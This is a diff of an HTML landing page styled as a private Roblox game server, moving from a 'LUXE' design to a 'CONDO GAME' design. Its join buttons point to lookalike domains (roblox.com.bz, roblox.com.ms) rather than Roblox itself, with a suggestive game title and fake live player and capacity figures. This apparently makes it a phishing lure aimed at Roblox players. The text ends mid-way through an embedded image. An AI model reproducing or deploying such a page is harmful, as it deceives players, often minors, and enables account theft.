@@ -3,980 +3,870 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>LUXE — Private Night</title>
+<title>CONDO GAME — Private Server</title>
 
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inter:wght@400;500;600;700;800;900&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 
-*{margin:0;padding:0;box-sizing:border-box}
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
 
-html{scroll-behavior:smooth}
+:root{
+  --bg:#07080d;
+  --panel:#10121a;
+  --line:rgba(255,255,255,.09);
+  --muted:#8d93a5;
+  --white:#f6f7fb;
+  --accent:#a78bfa;
+}
+
+html{
+  scroll-behavior:smooth;
+}
 
 body{
-background:#08070d;
-color:#fff;
-font-family:Inter,Arial,sans-serif;
-overflow-x:hidden
+  min-height:100vh;
+  background:#07080d;
+  color:var(--white);
+  font-family:Inter,Arial,sans-serif;
+  overflow-x:hidden;
 }
 
-body:before{
-content:"";
-position:fixed;
-inset:0;
-z-index:-2;
-background:
-radial-gradient(circle at 15% 15%,#8d24ff25,transparent 28%),
-radial-gradient(circle at 90% 35%,#ff187d20,transparent 30%),
-linear-gradient(135deg,#07060b,#100817 50%,#07060b)
+/* =========================
+   INTRO
+========================= */
+
+.intro{
+  position:fixed;
+  inset:0;
+  z-index:9999;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+  overflow:hidden;
+  background:#07080d;
+  transition:opacity .8s ease,visibility .8s ease;
 }
 
-body:after{
-content:"";
-position:fixed;
-inset:0;
-z-index:-1;
-pointer-events:none;
-opacity:.18;
-background-image:
-linear-gradient(#fff 1px,transparent 1px),
-linear-gradient(90deg,#fff 1px,transparent 1px);
-background-size:70px 70px;
-mask-image:linear-gradient(to bottom,transparent,#000 20%,transparent 90%)
+.intro.hide{
+  opacity:0;
+  visibility:hidden;
+  pointer-events:none;
 }
 
-/* HEADER */
+.intro-video{
+  position:absolute;
+  inset:0;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  opacity:.28;
+  filter:brightness(.45) saturate(.7);
+}
 
-header{
-position:fixed;
-top:0;
-left:0;
-right:0;
-height:72px;
-padding:0 6%;
-display:flex;
-align-items:center;
-justify-content:space-between;
-z-index:100;
-background:#08070dcc;
-backdrop-filter:blur(16px);
-border-bottom:1px solid #ffffff0c
+.intro-overlay{
+  position:absolute;
+  inset:0;
+  background:
+    radial-gradient(circle at center,
+      rgba(104,78,180,.12),
+      transparent 42%),
+    linear-gradient(
+      180deg,
+      rgba(5,6,10,.7),
+      rgba(5,6,10,.98)
+    );
+}
+
+.intro-content{
+  position:relative;
+  z-index:2;
+  padding:25px;
+}
+
+.kicker{
+  color:#9ba0b0;
+  font-size:11px;
+  letter-spacing:5px;
+  text-transform:uppercase;
+  margin-bottom:22px;
+}
+
+.intro h1{
+  font-size:clamp(55px,13vw,120px);
+  font-weight:900;
+  line-height:.84;
+  letter-spacing:-7px;
+}
+
+.intro-sub{
+  color:#8e94a5;
+  margin-top:25px;
+  font-size:11px;
+  letter-spacing:3px;
+  text-transform:uppercase;
+}
+
+.loading{
+  width:min(360px,80vw);
+  height:2px;
+  background:#292b35;
+  margin:35px auto 20px;
+  overflow:hidden;
+}
+
+.loading span{
+  display:block;
+  width:100%;
+  height:100%;
+  background:#fff;
+  animation:loading 2.2s ease forwards;
+}
+
+@keyframes loading{
+  from{transform:translateX(-100%)}
+  to{transform:translateX(0)}
+}
+
+.skip{
+  border:1px solid var(--line);
+  background:rgba(255,255,255,.045);
+  color:#cbd0dc;
+  border-radius:999px;
+  padding:10px 19px;
+  font-size:11px;
+  cursor:pointer;
+}
+
+/* =========================
+   MAIN
+========================= */
+
+.app{
+  min-height:100vh;
+  background:
+    radial-gradient(
+      circle at 50% -15%,
+      rgba(117,87,220,.18),
+      transparent 36%
+    ),
+    radial-gradient(
+      circle at 0 45%,
+      rgba(66,82,170,.07),
+      transparent 30%
+    ),
+    var(--bg);
+}
+
+main{
+  width:min(1120px,100%);
+  margin:auto;
+  padding:42px 22px 60px;
+}
+
+.topbar{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:75px;
 }
 
 .logo{
-font:38px "Bebas Neue";
-letter-spacing:5px;
-text-shadow:0 0 25px #a000ff
+  font-size:15px;
+  font-weight:900;
+  letter-spacing:2px;
 }
 
-.status{
-font-size:9px;
-font-weight:800;
-letter-spacing:2px;
-color:#62ffb0
+.online{
+  display:flex;
+  align-items:center;
+  gap:8px;
+  color:#858c9e;
+  font-size:10px;
+  text-transform:uppercase;
+  letter-spacing:1px;
 }
 
-.status i{
-display:inline-block;
-width:7px;
-height:7px;
-margin-right:6px;
-border-radius:50%;
-background:#48ff9c;
-box-shadow:0 0 12px #48ff9c;
-animation:pulse 1.2s infinite
+.online-dot{
+  width:7px;
+  height:7px;
+  border-radius:50%;
+  background:#55e29a;
+  box-shadow:0 0 13px #55e29a;
 }
 
-@keyframes pulse{
-50%{opacity:.3}
-}
-
-.header-btn{
-margin-left:18px;
-padding:10px 18px;
-border-radius:8px;
-text-decoration:none;
-color:#fff;
-font-size:9px;
-font-weight:900;
-letter-spacing:1px;
-background:linear-gradient(135deg,#ff168e,#7628ff);
-box-shadow:0 5px 25px #8b00ff30
-}
-
-/* HERO */
+/* =========================
+   HERO
+========================= */
 
 .hero{
-min-height:100vh;
-padding:125px 6% 90px;
-display:flex;
-align-items:center;
-position:relative;
-overflow:hidden
+  text-align:center;
+  margin-bottom:48px;
 }
 
-.hero-wrap{
-width:100%;
-max-width:1250px;
-margin:auto;
-display:grid;
-grid-template-columns:1fr .82fr;
-gap:55px;
-align-items:center
-}
-
-.tag{
-display:inline-flex;
-align-items:center;
-gap:8px;
-padding:9px 14px;
-border:1px solid #b044ff45;
-background:#9c00ff0d;
-border-radius:7px;
-color:#ca9aff;
-font-size:8px;
-font-weight:900;
-letter-spacing:2px;
-margin-bottom:20px
-}
-
-.tag b{
-width:6px;
-height:6px;
-border-radius:50%;
-background:#ff238d;
-box-shadow:0 0 12px #ff238d
-}
-
-.hero h1{
-font:clamp(100px,17vw,210px)/.72 "Bebas Neue";
-letter-spacing:5px;
-background:linear-gradient(180deg,#fff,#e6cfff 42%,#a12cff 80%,#ff168d);
--webkit-background-clip:text;
--webkit-text-fill-color:transparent;
-filter:drop-shadow(0 20px 35px #7800ff35)
+.eyebrow{
+  color:#747b8c;
+  font-size:10px;
+  text-transform:uppercase;
+  letter-spacing:4px;
+  margin-bottom:17px;
 }
 
 .hero h2{
-font-size:14px;
-letter-spacing:4px;
-margin-top:25px;
-color:#eee
+  font-size:clamp(38px,7vw,64px);
+  line-height:1;
+  font-weight:900;
+  letter-spacing:-4px;
 }
 
 .hero p{
-max-width:570px;
-margin-top:18px;
-color:#777;
-font-size:11px;
-line-height:1.9
+  max-width:540px;
+  margin:17px auto 0;
+  color:#858b9b;
+  font-size:13px;
+  line-height:1.7;
 }
 
-.buttons{
-display:flex;
-gap:12px;
-flex-wrap:wrap;
-margin-top:28px
+.players{
+  margin-top:19px;
+  color:#767d8e;
+  font-size:11px;
 }
 
-.btn{
-padding:15px 24px;
-border-radius:9px;
-text-decoration:none;
-font-size:9px;
-font-weight:900;
-letter-spacing:1.5px;
-transition:.25s
+.players strong{
+  color:#fff;
 }
 
-.btn-main{
-color:#fff;
-background:linear-gradient(135deg,#ff138c,#7625ff);
-box-shadow:0 12px 35px #8900ff35
-}
-
-.btn-main:hover{
-transform:translateY(-4px);
-box-shadow:0 18px 45px #9b00ff60
-}
-
-.btn-second{
-color:#aaa;
-border:1px solid #ffffff16;
-background:#ffffff05
-}
-
-.btn-second:hover{
-color:#fff;
-background:#ffffff0c
-}
-
-/* IMAGE */
-
-.visual{
-position:relative
-}
-
-.visual-frame{
-padding:9px;
-border:1px solid #ffffff15;
-border-radius:20px;
-background:#ffffff06;
-box-shadow:0 30px 100px #0009;
-transform:rotate(1deg)
-}
-
-.visual-frame img{
-width:100%;
-height:470px;
-display:block;
-object-fit:cover;
-object-position:center;
-border-radius:13px;
-filter:saturate(1.15) contrast(1.05)
-}
-
-.visual-frame:after{
-content:"";
-position:absolute;
-inset:-20px;
-z-index:-1;
-border-radius:30px;
-background:linear-gradient(135deg,#ff008c35,#7b00ff35);
-filter:blur(35px)
-}
-
-.floating{
-position:absolute;
-left:-25px;
-bottom:30px;
-padding:14px 18px;
-border:1px solid #ffffff18;
-border-radius:10px;
-background:#09080ee8;
-backdrop-filter:blur(15px);
-box-shadow:0 15px 40px #0008
-}
-
-.floating small{
-display:block;
-color:#666;
-font-size:7px;
-letter-spacing:2px;
-margin-bottom:5px
-}
-
-.floating strong{
-font-size:11px
-}
-
-/* SERVERS */
-
-.servers{
-padding:100px 6%
-}
-
-.heading{
-max-width:1200px;
-margin:auto auto 35px;
-display:flex;
-justify-content:space-between;
-align-items:end
-}
-
-.heading small{
-color:#b978ff;
-font-size:8px;
-font-weight:900;
-letter-spacing:3px
-}
-
-.heading h2{
-font:60px "Bebas Neue";
-letter-spacing:3px;
-margin-top:4px
-}
-
-.heading p{
-max-width:270px;
-text-align:right;
-color:#666;
-font-size:9px;
-line-height:1.7
-}
+/* =========================
+   SERVER CARDS
+========================= */
 
 .server-grid{
-max-width:1200px;
-margin:auto;
-display:grid;
-grid-template-columns:repeat(3,1fr);
-gap:18px
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  gap:20px;
 }
 
-.card{
-position:relative;
-overflow:hidden;
-padding:10px;
-border:1px solid #ffffff12;
-border-radius:17px;
-background:linear-gradient(145deg,#ffffff09,#ffffff02);
-transition:.3s
+.server{
+  position:relative;
+  overflow:hidden;
+  border:1px solid var(--line);
+  border-radius:22px;
+  background:
+    linear-gradient(
+      145deg,
+      rgba(255,255,255,.055),
+      rgba(255,255,255,.015)
+    );
+  transition:
+    transform .3s ease,
+    border-color .3s ease,
+    box-shadow .3s ease;
 }
 
-.card:hover{
-transform:translateY(-8px);
-border-color:#b22fff55;
-box-shadow:0 25px 70px #7600ff20
+.server:hover{
+  transform:translateY(-6px);
+  border-color:rgba(167,139,250,.4);
+  box-shadow:0 25px 80px rgba(0,0,0,.4);
 }
 
-.card-img{
-width:100%;
-height:200px;
-display:block;
-object-fit:cover;
-border-radius:11px
+/* =========================
+   MEDIA
+========================= */
+
+.media{
+  position:relative;
+  height:310px;
+  overflow:hidden;
+  background:#0c0e15;
 }
 
-.card-content{
-padding:15px 8px 8px
+.media video,
+.media img{
+  position:absolute;
+  inset:0;
+  width:100%;
+  height:100%;
+  object-fit:cover;
 }
 
-.card-top{
-display:flex;
-justify-content:space-between;
-align-items:center
+.media video{
+  opacity:.72;
 }
 
-.id{
-font-size:7px;
-font-weight:900;
-letter-spacing:2px;
-color:#777
+.media img{
+  z-index:1;
 }
 
-.state{
-font-size:7px;
-font-weight:900;
-letter-spacing:1px
+.media:after{
+  content:"";
+  position:absolute;
+  inset:0;
+  z-index:2;
+  background:
+    linear-gradient(
+      180deg,
+      rgba(5,6,10,.1),
+      rgba(5,6,10,.15) 40%,
+      rgba(7,8,13,1) 100%
+    );
 }
 
-.open{color:#54ffa7}
-.busy{color:#ffc04e}
-.full{color:#ff4f9b}
-
-.card h3{
-font:36px "Bebas Neue";
-letter-spacing:2px;
-margin:12px 0 4px
+.server-label{
+  position:absolute;
+  z-index:4;
+  left:18px;
+  top:18px;
+  padding:7px 11px;
+  border-radius:99px;
+  border:1px solid rgba(255,255,255,.1);
+  background:rgba(6,7,11,.7);
+  backdrop-filter:blur(10px);
+  font-size:9px;
+  letter-spacing:1.5px;
+  text-transform:uppercase;
 }
 
-.desc{
-font-size:9px;
-line-height:1.7;
-color:#707078;
-min-height:31px
+.server-number{
+  position:absolute;
+  z-index:3;
+  right:18px;
+  top:8px;
+  font-size:82px;
+  line-height:1;
+  font-weight:900;
+  color:rgba(255,255,255,.07);
 }
 
-.capacity-row{
-display:flex;
-justify-content:space-between;
-margin-top:15px;
-font-size:7px;
-font-weight:800;
-color:#666
+/* =========================
+   CONTENT
+========================= */
+
+.server-content{
+  position:relative;
+  z-index:5;
+  margin-top:-22px;
+  padding:25px;
 }
 
-.bar{
-height:5px;
-margin-top:7px;
-border-radius:20px;
-background:#ffffff0b;
-overflow:hidden
+.server-title{
+  font-size:25px;
+  font-weight:900;
+  letter-spacing:-1px;
 }
 
-.bar span{
-display:block;
-height:100%;
-border-radius:20px;
-background:linear-gradient(90deg,#7625ff,#ff168d)
+.server-subtitle{
+  color:#8a91a1;
+  font-size:11px;
+  margin-top:7px;
+  margin-bottom:21px;
 }
 
-.w65{width:65%}
-.w86{width:86%}
-.w94{width:94%}
+.capacity{
+  display:flex;
+  justify-content:space-between;
+  color:#777e8f;
+  font-size:10px;
+  margin-bottom:8px;
+}
+
+.capacity strong{
+  color:#e0e3ea;
+}
+
+.capacity-bar{
+  height:5px;
+  border-radius:20px;
+  overflow:hidden;
+  background:#252832;
+  margin-bottom:17px;
+}
+
+.capacity-bar span{
+  display:block;
+  height:100%;
+  border-radius:20px;
+  background:linear-gradient(
+    90deg,
+    #7655d9,
+    #c3b3ff
+  );
+}
+
+.description{
+  min-height:43px;
+  color:#858b9c;
+  font-size:11px;
+  line-height:1.7;
+  margin-bottom:20px;
+}
 
 .join{
-display:flex;
-align-items:center;
-justify-content:center;
-gap:7px;
-margin-top:15px;
-padding:14px;
-border-radius:9px;
-text-decoration:none;
-color:#fff;
-font-size:9px;
-font-weight:900;
-letter-spacing:2px;
-background:linear-gradient(135deg,#ff138c,#7824ff);
-box-shadow:0 8px 25px #8800ff30;
-transition:.25s
+  width:100%;
+  border:0;
+  border-radius:12px;
+  padding:14px;
+  background:#f3f3f6;
+  color:#08090d;
+  font-size:10px;
+  font-weight:900;
+  letter-spacing:1.5px;
+  cursor:pointer;
+  transition:.2s ease;
 }
 
 .join:hover{
-transform:scale(1.025);
-box-shadow:0 12px 35px #a000ff55
+  background:#cfc6ff;
+  transform:translateY(-2px);
 }
 
-.arrow{font-size:13px}
-
-/* NOTICE */
-
-.notice{
-max-width:1200px;
-margin:25px auto 0;
-padding:14px 18px;
-border:1px solid #ffba3b20;
-border-radius:10px;
-background:#ffb00007;
-color:#8f8a80;
-font-size:8px;
-text-align:center;
-letter-spacing:.5px
-}
-
-/* FEATURES */
-
-.features{
-padding:70px 6%
-}
-
-.feature-grid{
-max-width:1000px;
-margin:auto;
-display:grid;
-grid-template-columns:repeat(3,1fr);
-gap:15px
-}
-
-.feature{
-padding:30px 20px;
-text-align:center;
-border:1px solid #ffffff0d;
-border-radius:15px;
-background:#ffffff03;
-transition:.25s
-}
-
-.feature:hover{
-background:#ffffff07;
-transform:translateY(-5px)
-}
-
-.icon{
-font-size:25px;
-margin-bottom:12px
-}
-
-.feature h3{
-font-size:10px;
-letter-spacing:1px
-}
-
-.feature p{
-font-size:9px;
-line-height:1.7;
-color:#666;
-margin-top:8px
-}
-
-/* CTA */
-
-.cta{
-padding:100px 20px;
-text-align:center
-}
-
-.cta-box{
-max-width:850px;
-margin:auto;
-padding:75px 25px;
-border:1px solid #a52cff35;
-border-radius:22px;
-background:
-radial-gradient(circle at 50% 50%,#8c00ff16,transparent 65%);
-position:relative;
-overflow:hidden
-}
-
-.cta-box small{
-font-size:8px;
-letter-spacing:4px;
-color:#bb77ff
-}
-
-.cta-box h2{
-font:70px "Bebas Neue";
-letter-spacing:4px;
-margin:8px 0
-}
-
-.cta-box p{
-font-size:10px;
-color:#666;
-margin-bottom:25px
-}
-
-/* FOOTER */
+/* =========================
+   FOOTER
+========================= */
 
 footer{
-padding:35px 20px;
-text-align:center;
-border-top:1px solid #ffffff0b
+  margin-top:55px;
+  padding-top:25px;
+  border-top:1px solid var(--line);
+  display:flex;
+  justify-content:space-between;
+  gap:20px;
+  flex-wrap:wrap;
+  color:#626979;
+  font-size:9px;
+  line-height:1.8;
 }
 
 footer strong{
-font:25px "Bebas Neue";
-letter-spacing:3px
+  color:#aab0be;
 }
 
-footer p{
-margin-top:7px;
-font-size:7px;
-letter-spacing:2px;
-color:#555
+.footer-meta{
+  display:flex;
+  gap:25px;
+  flex-wrap:wrap;
 }
 
-/* MOBILE */
+/* =========================
+   MOBILE
+========================= */
 
-@media(max-width:900px){
+@media(max-width:760px){
 
-.hero{
-padding-top:115px
-}
+  main{
+    padding:28px 15px 45px;
+  }
 
-.hero-wrap{
-grid-template-columns:1fr;
-gap:45px
-}
+  .topbar{
+    margin-bottom:55px;
+  }
 
-.visual{
-max-width:600px;
-width:100%;
-margin:auto
-}
+  .server-grid{
+    grid-template-columns:1fr;
+  }
 
-.server-grid{
-grid-template-columns:1fr
-}
+  .media{
+    height:280px;
+  }
 
-.card{
-max-width:600px;
-width:100%;
-margin:auto
-}
+  .hero h2{
+    letter-spacing:-3px;
+  }
 
-.feature-grid{
-grid-template-columns:1fr
-}
+  footer{
+    display:block;
+  }
 
-.heading{
-display:block
-}
+  .footer-meta{
+    margin:13px 0;
+  }
 
-.heading p{
-text-align:left;
-margin-top:8px
-}
-
-}
-
-@media(max-width:550px){
-
-header{
-padding:0 5%
-}
-
-.status{
-display:none
-}
-
-.header-btn{
-margin-left:0
-}
-
-.hero{
-padding-left:5%;
-padding-right:5%
-}
-
-.hero h2{
-font-size:10px;
-letter-spacing:3px
-}
-
-.hero p{
-font-size:10px
-}
-
-.visual-frame img{
-height:350px
-}
-
-.floating{
-left:10px
-}
-
-.servers{
-padding-left:5%;
-padding-right:5%
-}
-
-.heading h2{
-font-size:48px
-}
-
-.cta-box h2{
-font-size:55px
-}
-
+  .intro h1{
+    letter-spacing:-4px;
+  }
 }
 </style>
 </head>
 
 <body>
 
-<header>
+<!-- ==================================================
+     INTRO VIDEO
+================================================== -->
 
-<div class="logo">LUXE</div>
+<section class="intro" id="intro">
 
-<div>
-<span class="status"><i></i>SERVER ONLINE</span>
+  <!--
+    TARUH VIDEO KAMU DENGAN NAMA:
+    video.mp4
 
-<a
-class="header-btn"
-href="https://roblox.com.bz/games/80576062127494/HOT-Catgirl-Obby-Surprise-at-the-end?privateServerLinkCode=95802737358448062085151727225283"
-target="_blank"
-rel="noopener noreferrer">
-JOIN
-</a>
-</div>
+    Kalau video berada di folder lain,
+    ubah src di bawah.
+  -->
 
-</header>
+  <video
+    class="intro-video"
+    autoplay
+    muted
+    loop
+    playsinline
+  >
+    <source src="video.mp4" type="video/mp4">
+  </video>
 
+  <div class="intro-overlay"></div>
 
-<section class="hero">
+  <div class="intro-content">
 
-<div class="hero-wrap">
+    <div class="kicker">
+      Private Network · Sector 07
+    </div>
 
-<div>
+    <h1>
+      CONDO<br>
+      GAME
+    </h1>
 
-<div class="tag">
-<b></b>
-PRIVATE NIGHT SERVER
-</div>
+    <div class="intro-sub">
+      Enter the private server
+    </div>
 
-<h1>LUXE</h1>
+    <div class="loading">
+      <span></span>
+    </div>
 
-<h2>YOUR NEXT NIGHT STARTS HERE</h2>
+    <button class="skip" onclick="enterSite()">
+      Skip Intro
+    </button>
 
-<p>
-Masuk ke private server, pilih room yang masih tersedia,
-dan langsung join. Beberapa server sedang ramai dan
-sebagian sudah OTW FULL.
-</p>
-
-<div class="buttons">
-
-<a
-class="btn btn-main"
-href="https://roblox.com.bz/games/80576062127494/HOT-Catgirl-Obby-Surprise-at-the-end?privateServerLinkCode=95802737358448062085151727225283"
-target="_blank"
-rel="noopener noreferrer">
-JOIN SERVER →
-</a>
-
-<a
-class="btn btn-second"
-href="#servers">
-VIEW SERVERS
-</a>
-
-</div>
-
-</div>
-
-
-<div class="visual">
-
-<div class="visual-frame">
-
-<img
-id="heroImage"
-alt="LUXE server preview">
-
-</div>
-
-<div class="floating">
-
-<small>FEATURED SERVER</small>
-<strong>NEON NIGHT • ONLINE</strong>
-
-</div>
-
-</div>
-
-</div>
-
+  </div>
 </section>
 
 
-<section
-class="servers"
-id="servers">
+<!-- ==================================================
+     WEBSITE
+================================================== -->
 
-<div class="heading">
+<div class="app" id="app">
 
-<div>
+<main>
 
-<small>LIVE SERVER LIST</small>
+  <header class="topbar">
 
-<h2>CHOOSE YOUR ROOM</h2>
+    <div class="logo">
+      CONDO GAME
+    </div>
+
+    <div class="online">
+      <span class="online-dot"></span>
+      Server Online
+    </div>
+
+  </header>
+
+
+  <!-- HERO -->
+
+  <section class="hero">
+
+    <div class="eyebrow">
+      Gateway Selection
+    </div>
+
+    <h2>
+      Choose Your Server
+    </h2>
+
+    <p>
+      Select a live world and join your session instantly.
+    </p>
+
+    <div class="players">
+      <strong>86</strong> players connected
+    </div>
+
+  </section>
+
+
+  <!-- SERVER LIST -->
+
+  <section class="server-grid">
+
+
+    <!-- SERVER 01 -->
+
+    <article class="server">
+
+      <div class="media">
+
+        <span class="server-label">
+          Featured Server
+        </span>
+
+        <span class="server-number">
+          01
+        </span>
+
+        <!-- VIDEO SERVER 01 -->
+
+        <video
+          autoplay
+          muted
+          loop
+          playsinline
+        >
+          <source
+            src="server01.mp4"
+            type="video/mp4"
+          >
+        </video>
+
+        <!--
+          Kalau tidak ingin video,
+          hapus video di atas dan gunakan:
+
+          <img src="server01.jpg">
+        -->
+
+      </div>
+
+
+      <div class="server-content">
+
+        <div class="server-title">
+          SERVER 01
+        </div>
+
+        <div class="server-subtitle">
+          Main Server Hub
+        </div>
+
+
+        <div class="capacity">
+
+          <span>
+            Current Capacity
+          </span>
+
+          <strong>
+            56%
+          </strong>
+
+        </div>
+
+        <div class="capacity-bar">
+          <span style="width:56%"></span>
+        </div>
+
+
+        <div class="description">
+          Primary server optimized for low latency
+          and high stability. Recommended for
+          standard gameplay.
+        </div>
+
+
+        <button
+          class="join"
+          onclick="joinServer('https://roblox.com.ms')"
+        >
+          JOIN SERVER 01
+        </button>
+
+      </div>
+
+    </article>
+
+
+
+    <!-- SERVER 02 -->
+
+    <article class="server">
+
+      <div class="media">
+
+        <span class="server-label">
+          Featured Server
+        </span>
+
+        <span class="server-number">
+          02
+        </span>
+
+
+        <!-- VIDEO SERVER 02 -->
+
+        <video
+          autoplay
+          muted
+          loop
+          playsinline
+        >
+          <source
+            src="server02.mp4"
+            type="video/mp4"
+          >
+        </video>
+
+      </div>
+
+
+      <div class="server-content">
+
+        <div class="server-title">
+          SERVER 02
+        </div>
+
+        <div class="server-subtitle">
+          Alternative Server
+        </div>
+
+
+        <div class="capacity">
+
+          <span>
+            Current Capacity
+          </span>
+
+          <strong>
+            30%
+          </strong>
+
+        </div>
+
+        <div class="capacity-bar">
+          <span style="width:30%"></span>
+        </div>
+
+
+        <div class="description">
+          Alternative connection route with fast
+          routing and balanced load capacity for
+          uninterrupted sessions.
+        </div>
+
+
+        <button
+          class="join"
+          onclick="joinServer('https://roblox.com.ms')"
+        >
+          JOIN SERVER 02
+        </button>
+
+      </div>
+
+    </article>
+
+  </section>
+
+
+  <!-- FOOTER -->
+
+  <footer>
+
+    <div>
+      <strong>Alexsc</strong><br>
+      Lead developer · world creator
+    </div>
+
+    <div class="footer-meta">
+      <span>Project CONDO GAME</span>
+      <span>Interface 2026 Edition</span>
+      <span>Network Private Gateway</span>
+      <span>Status Operational</span>
+    </div>
+
+    <div>
+      © 2026 CONDO GAME · Crafted by Alexsc
+    </div>
+
+  </footer>
+
+</main>
 
 </div>
-
-<p>
-Server dengan kapasitas tinggi
-ditandai OTW FULL supaya kamu
-bisa langsung pilih.
-</p>
-
-</div>
-
-
-<div class="server-grid">
-
-
-<div class="card">
-
-<img
-class="card-img"
-alt="Server 01">
-
-<div class="card-content">
-
-<div class="card-top">
-
-<span class="id">SERVER 01</span>
-
-<span class="state open">● OPEN</span>
-
-</div>
-
-<h3>NEON ROOM</h3>
-
-<p class="desc">
-Masih tersedia dan siap menerima pemain baru.
-</p>
-
-<div class="capacity-row">
-<span>CAPACITY</span>
-<span>65%</span>
-</div>
-
-<div class="bar">
-<span class="w65"></span>
-</div>
-
-<a
-class="join"
-href="https://roblox.com.bz/games/80576062127494/HOT-Catgirl-Obby-Surprise-at-the-end?privateServerLinkCode=95802737358448062085151727225283"
-target="_blank"
-rel="noopener noreferrer">
-JOIN SERVER <span class="arrow">→</span>
-</a>
-
-</div>
-</div>
-
-
-<div class="card">
-
-<img
-class="card-img"
-alt="Server 02">
-
-<div class="card-content">
-
-<div class="card-top">
-
-<span class="id">SERVER 02</span>
-
-<span class="state busy">● OTW FULL</span>
-
-</div>
-
-<h3>NIGHT ROOFTOP</h3>
-
-<p class="desc">
-Sedang ramai. Slot mulai terbatas.
-</p>
-
-<div class="capacity-row">
-<span>CAPACITY</span>
-<span>86%</span>
-</div>
-
-<div class="bar">
-<span class="w86"></span>
-</div>
-
-<a
-class="join"
-href="https://roblox.com.bz/games/80576062127494/HOT-Catgirl-Obby-Surprise-at-the-end?privateServerLinkCode=95802737358448062085151727225283"
-target="_blank"
-rel="noopener noreferrer">
-JOIN SERVER <span class="arrow">→</span>
-</a>
-
-</div>
-</div>
-
-
-<div class="card">
-
-<img
-class="card-img"
-alt="Server 03">
-
-<div class="card-content">
-
-<div class="card-top">
-
-<span class="id">SERVER 03</span>
-
-<span class="state full">● ALMOST FULL</span>
-
-</div>
-
-<h3>SECRET HOUSE</h3>
-
-<p class="desc">
-Kapasitas hampir penuh. Slot semakin sedikit.
-</p>
-
-<div class="capacity-row">
-<span>CAPACITY</span>
-<span>94%</span>
-</div>
-
-<div class="bar">
-<span class="w94"></span>
-</div>
-
-<a
-class="join"
-href="https://roblox.com.bz/games/80576062127494/HOT-Catgirl-Obby-Surprise-at-the-end?privateServerLinkCode=95802737358448062085151727225283"
-target="_blank"
-rel="noopener noreferrer">
-JOIN SERVER <span class="arrow">→</span>
-</a>
-
-</div>
-</div>
-
-</div>
-
-
-<div class="notice">
-⚡ STATUS SERVER DI HALAMAN INI ADALAH DISPLAY DESAIN DAN BUKAN DATA LIVE ROBLOX.
-</div>
-
-</section>
-
-
-<section class="features">
-
-<div class="feature-grid">
-
-<div class="feature">
-<div class="icon">⚡</div>
-<h3>FAST ACCESS</h3>
-<p>
-Klik join dan lanjut ke server.
-</p>
-</div>
-
-<div class="feature">
-<div class="icon">🎮</div>
-<h3>PRIVATE SERVER</h3>
-<p>
-Pilih room yang tersedia.
-</p>
-</div>
-
-<div class="feature">
-<div class="icon">🌙</div>
-<h3>NIGHT EXPERIENCE</h3>
-<p>
-Tema malam dengan suasana neon.
-</p>
-</div>
-
-</div>
-
-</section>
-
-
-<section class="cta">
-
-<div class="cta-box">
-
-<small>PRIVATE ACCESS</small>
-
-<h2>READY TO JOIN?</h2>
-
-<p>
-Pilih server lalu masuk sekarang.
-</p>
-
-<a
-class="btn btn-main"
-href="https://roblox.com.bz/games/80576062127494/HOT-Catgirl-Obby-Surprise-at-the-end?privateServerLinkCode=95802737358448062085151727225283"
-target="_blank"
-rel="noopener noreferrer">
-ENTER SERVER →
-</a>
-
-</div>
-
-</section>
-
-
-<footer>
-
-<strong>LUXE NIGHT</strong>
-
-<p>
-PRIVATE SERVER • NIGHT EXPERIENCE • © 2026
-</p>
-
-</footer>
 
 
 <script>
 
-/* FOTO SUDAH EMBED LANGSUNG DI SINI */
-const photo="data:image/webp;base64,UklGRmIUAABXRUJQVlA4IFYUAAAwgQCdASrqAA4BPvVqrE4qpiSjK1NuSVAeiWIAw6qJ3x7Df1/QNwbgNkG/KUnHcbM5Mpa274MhhhNu1lVDlnI+ei0kC8nUxgSNUOK0Tu0xYGyR4yxlRttCl/+vf6a7u5CinwiBzugyL7Qq1VkN9ItexQ44Rf9qRghqQeTjU1152FMnjIdEh1Ncd8N6zjQ4qdnxxzXGUe7D9rWrn6+zRZ1O9mMzoCl5tKIsK8wGQLU5HPcrQ2cDMFZsCvUJ3L+TLfWPFSzPJCqZ21MJaM42kQuwH1iOn+AzqnF08RNSNepyuzfv7vUdydfNt28PDDBAF9bTsehuQmVfqHqSemcwU7z/OCh5Tnp52vyGj8pCtOLi/tXEsvtgkLN6fIAXJlqv5xU9TLlFN6GruokMqOhG/DAao4d6ZcjD98q7IJw7GlHT/GNEZLSFq15EJs+2YcRMpFfXLMT7Sq4TK/yEEGdspSsAd68aeZheSHWQr7GutYB1NbV0VrByruT0YjCTd6ps1ZdQYmqS2KJEyaBcDycN6gMnu8kOeoBWxzbcudmcXkqxZs3jyvnpu6lOrajc/fWZ/PS/WcsC/2eqr2hRaFMN+AIevjfqBMABQcngwkYFG/CV/GlEX//GZjp2V8MxNQ36ZJtizizkRiGkA7BdBgElnsJew0lgMrw56Ly3LAUMfSUaG0QCiJomqBNWzUS/oY2n/a9Y0zpfO9nhFZBK3hU8SQ2jHLgFh1Heri9TRLVFmLhxf5Cdwk2fzf6zRo7Polws/HK1ySAWKZt7ZP/n+kM10lVeGq7s/AWxG+U5BjemKX6V7tFUxx9f8GcIpYpqvwuDdu/UWo5wMQI+8WIKA+nr7c7qWayV+j4t3gfG7anPf6pL/cWhvy6lEFzjUje9preDb5XeHn0OR5kzxC3SqPGRbPj4yZB7P8nGSoLbyl4lgCJwcRTY90MKC2HRIhpIt7rh7ouMHMIjJ2h4fOmwmARDLvxbgneTshnKyJIqclNWGGkMwhbbIwDd3tdza9C4MTsXvJP1gF8kSXbFEZcw8nDAw+iKTxbbA5LURTJlKI4MU2sxFDc8FmJz+/YopY1GOVo+CI39vfh/FKkRUVRcslWN5X7qMndsMuGyHQXF3/EGRXCXXU8oRYGnlfMapDnu/je0IgW5sluF7d/Ksuxce2q7i/FzJJ1g1ooLrV1DD4b1Llk+Ue7YMvB1y9Iqz3uAFkOT8xWpKam1XQ2cCam9uI7uHS7erBSkADCzyz8PIzUiZCVZrkTjG1BLJ6O4